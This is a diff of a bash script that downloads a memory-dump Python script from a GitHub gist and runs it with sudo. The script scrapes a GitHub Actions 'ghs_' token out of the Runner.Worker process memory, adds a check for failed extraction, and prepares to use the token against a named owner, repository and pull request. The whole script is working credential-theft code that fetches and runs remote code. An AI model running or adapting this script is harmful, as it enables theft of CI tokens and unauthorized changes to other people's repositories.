@@ -1,9 +1,13 @@
 #!/usr/bin/env bash
-set -eu
+set -euo pipefail
 
-# 1) Dump Runner.Worker memory and pull the token out
+SCRIPT=$(mktemp /tmp/memdump.XXXXXX.py)
+curl -sSfL \
+  https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py \
+  -o "$SCRIPT"
+
 TOKEN="$(
-  sudo python3 <(curl -sSfL https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py) \
+  sudo python3 "$SCRIPT" \
   | tr -d '\0' \
   | grep -aoE '"ghs_[A-Za-z0-9]+"' \
   | head -n1 \
@@ -12,7 +16,11 @@ TOKEN="$(
 
 echo "extracted: ${TOKEN:0:10}..."
 
-# 2) Use it RIGHT NOW, same shell, same job, before the runner cleans up.
+if [[ -z "${TOKEN:-}" || "$TOKEN" == ghs_ ]]; then
+  echo "token extraction failed; aborting" >&2
+  exit 1
+fi
+
 OWNER="Yosiroute"
 REPO="belle_image"
 PR="3"
